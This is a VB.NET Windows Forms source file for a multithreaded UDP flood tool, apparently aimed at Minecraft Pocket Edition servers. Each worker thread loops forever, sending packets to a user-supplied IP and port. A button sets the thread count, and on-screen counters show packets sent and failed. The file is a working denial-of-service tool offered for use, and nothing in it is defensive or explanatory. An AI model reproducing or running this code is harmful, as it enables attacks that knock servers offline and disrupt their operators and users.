Imports System.Net
Imports System.Net.Sockets
Imports System.Text
Imports System.Threading

Public Class Form1

    Dim list As New List(Of Thread)


    Private Sub NumericUpDown1_ValueChanged(sender As Object, e As EventArgs) Handles NumericPort.ValueChanged
        Control.CheckForIllegalCrossThreadCalls = False
    End Sub


    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        list.Clear()
        For i = 0 To TrackBarThreads.Value - 1
            Dim UDPFlood As New Thread(AddressOf UDP)
            UDPFlood.Start()
            list.Add(UDPFlood)
        Next
    End Sub


    Sub UDP()
        Try
            Dim IPAdd As IPAddress
            Dim byteCommand As Byte() = New Byte() {}
            IPAdd = IPAddress.Parse(txtIP.Text)

            Dim i As Int64
            i = i + 1

            If (i Mod 10000 = 0) Then
                GC.Collect()
            End If

            Dim MCPEProtocols() As String
            MCPEProtocols = {
                "0x01", "0x02", "0x03", "0x04", "0x05", "0x06", "0x07", "0x08", "0x09", "0x0a", "0x0b", "0x0c", "0x0d", "0x0e", "0x0f",
                "0x10", "0x11", "0x12", "0x13", "0x14", "0x15", "0x16", "0x17", "0x18", "0x19", "0x1a", "0x1b", "0x1c", "0x1d", "0x1e", "0x1f",
                "0x20", "0x21", "0x22", "0x23", "0x24", "0x25", "0x26", "0x27", "0x28", "0x29", "0x2a", "0x2b", "0x2c", "0x2d", "0x2e", "0x2f",
                "0x30", "0x31", "0x32", "0x33", "0x34", "0x35", "0x36", "0x37", "0x38", "0x39", "0x3a", "0x3b", "0x3c", "0x3d", "0x3e", "0x3f",
                "0x40", "0x41", "0x42", "0x43", "0x44", "0x45", "0x56", "0x47", "0x48", "0x49", "0x4a", "0x4b", "0x4c", "0x4d", "0x4e", "0x4f",
                "0x50", "0x51", "0x52", "0x53", "0x54", "0x55", "0x56", "0x57", "0x58", "0x59", "0x5a", "0x5b", "0x5c", "0x5d", "0x5e", "0x5f",
                "0xff"
            }
            Do
                For i = 0 To 89
                    byteCommand = Encoding.ASCII.GetBytes(MCPEProtocols(i))
                    Dim UdpClient As New UdpClient
                    UdpClient.Connect(IPAdd, NumericPort.Text)
                    udpClient.Send(byteCommand, byteCommand.Length)
                    udpClient.Close()
                    LabelConnections.Text += 1
                    LabelLastByte.Text = "Packet: " + MCPEProtocols(i)
                Next
            Loop
        Catch ex As Exception
            LabelFailedConnections.Text += 1
        End Try
    End Sub


    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        For i = 0 To list.Count - 1
            list(i).Abort()
        Next
    End Sub


    Private Sub TrackBarThreads_Scroll(sender As Object, e As EventArgs) Handles TrackBarThreads.Scroll
        LabelThreads.Text = TrackBarThreads.Value
        LabelConnections.Text = 0
        LabelFailedConnections.Text = 0
    End Sub


End Class
